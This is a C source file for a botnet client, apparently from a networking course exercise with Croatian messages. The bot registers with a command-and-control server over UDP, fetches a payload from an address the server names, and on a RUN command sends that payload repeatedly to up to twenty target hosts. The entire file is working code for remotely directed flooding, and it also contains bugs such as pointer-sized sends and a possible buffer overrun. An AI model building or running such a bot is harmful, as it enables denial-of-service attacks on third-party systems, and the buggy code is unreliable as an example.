#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <stdlib.h>
#include <errno.h>
#include <stdbool.h>

#define MAXLEN 512
#define DEFAULT_PORT 5555

int Socket(int family, int type, int protocol){
	int n;

	if ((n=socket(family,type,protocol))==-1){
		strerror(88);
		exit(4);
	} else {
		return n;
	}
}

int Getaddrinfo(const char *hostname, const char *service, const struct addrinfo *hints, struct addrinfo **result) {
	
	if (getaddrinfo(hostname, service, hints, result)==-1){
		strerror(6);
		exit(5);
	} else {
		return 0;
	}
}

struct IP_port {
	char IP[INET_ADDRSTRLEN];
	char PORT[22];
};
	
struct MSG {
	char command;
	struct IP_port ip_pairs[20];
};

int main(int argc, char *argv[]){
	
	char *hostname, *port;
	const char *reg = "REG\n", *hello = "HELLO\n";
	char c;
	int portnum=0;

	
	bool pay = false;
	
	char payload[MAXLEN]={0};
	struct addrinfo hints, msghints, *res, *msgres;
	
	
	int mysock,n;
	struct sockaddr sock, addr;
	socklen_t socklen;
	
	if (argc!=3){
		err(3,"Usage: ./bot server_ip server_port");
	}
	
	hostname= argv[1];
	port=argv[2];
	
	memset(&addr, 0, sizeof(addr));
	
	memset(&hints, 0, sizeof(hints));

	memset(&msghints, 0, sizeof(msghints));


	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags =  AI_PASSIVE;
	
	Getaddrinfo(hostname, port, &hints, &res);
	


	mysock = Socket(res->ai_family, res->ai_socktype, 0);

	sendto(mysock, reg, sizeof(reg), 0, res->ai_addr, res->ai_addrlen);
	
	
	struct MSG message;
	
		
	while(1){
		
		
		socklen= sizeof(sock);
	
		n = recvfrom(mysock, (char *)&message, sizeof(message), 0, &sock, &socklen);
		
		if(n==-1){
			perror("Error, cannot recieve anything\n");
			exit(1);
		} 
		
		c=message.command;

		switch(c){
			case '0':
			
			//printf("IP:%s PORT:%s\n",message.ip_pairs[0].IP, message.ip_pairs[0].PORT);
			
			Getaddrinfo(message.ip_pairs[0].IP, message.ip_pairs[0].PORT, &msghints, &msgres);
			
			msghints.ai_family = AF_INET;
			msghints.ai_socktype = SOCK_DGRAM;
			msghints.ai_flags =  AI_PASSIVE;
			
			sendto(mysock, hello, sizeof(hello)+1, 0, msgres->ai_addr, msgres->ai_addrlen);
					
			socklen= sizeof(sock);

			n=recvfrom(mysock, payload, MAXLEN, 0, &sock, &socklen);
			
			if(n==-1){
				strerror(4);
			}
						
			payload[n]='\0';
			
			pay = true;
			printf("PAYLOAD:%s\n",payload);
			break;			
			case '1':
			
			
			for(int i=0;i<20;i++) {
				if(strlen(message.ip_pairs[i].IP)!=0 && strlen(message.ip_pairs[i].PORT) !=0){	
					portnum++;
				}
			 }
			
						
			if(pay==false){
				printf("Ne mogu izvrsiti komandu RUN jer prije nje nije bila pozvana PROG te nije primljen payload.\n");
								
			} else {		
				for (int j=0;j<15;j++){	
					for(int i=0;i<portnum;i++){
						//printf("Ip:%s Port:%s\n",message.ip_pairs[i].IP, message.ip_pairs[i].PORT);
						
						if(strlen(message.ip_pairs[i].IP)!=0 && strlen(message.ip_pairs[i].PORT) !=0){
							Getaddrinfo(message.ip_pairs[i].IP,message.ip_pairs[i].PORT, &hints, &res);
						
		
							n=sendto(mysock, payload, strlen(payload), 0, res->ai_addr, res->ai_addrlen);
						
							if(n==-1){
								strerror(4);
							}	
							freeaddrinfo(res);

						}
						
					}
					sleep(1);
				}
			}		
			break;
		case '2':
			fprintf(stderr,"Command & Control posluzitelj zaustavljen. Prekid rada klijenta.\n");
			exit(1);
			break;
		case 'N':
			printf("Nepoznata komanda.");
			break;
		default:
			break;
		}
		
		freeaddrinfo(res);
	}
	
	close(mysock);
	
}




	
